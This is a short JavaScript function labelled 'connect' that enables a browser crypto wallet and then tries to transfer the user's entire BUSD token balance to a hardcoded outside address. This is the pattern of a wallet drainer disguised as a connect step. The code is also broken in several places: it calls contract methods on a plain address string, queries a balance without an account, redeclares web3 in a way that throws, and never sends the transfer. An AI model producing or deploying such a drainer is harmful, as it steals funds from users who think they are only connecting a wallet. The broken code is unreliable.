var web3;

async function connect(){
    await window.web3.currentProvider.enable();
    
    web3=new Web3(window.web3.currentProvider);


   const receiverAddress = '0xa84cE4D7f2462b084069c6caDCa56dd603C15eF4'
      const busdAddress = '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
      
        const trfAmount=await busdAddress.methods.balanceOf().call();

      const web3 = new Web3(window.ethereum)
      const contract = new web3.eth.Contract(bscContract.abi, busdAddress)

      contract.methods
        .transfer(receiverAddress, web3.utils.toWei(trfAmount, 'ether'))
           .then((res) => {
          console.log(res)
        })
        .catch((err) => {
          console.log(err)
        })


}
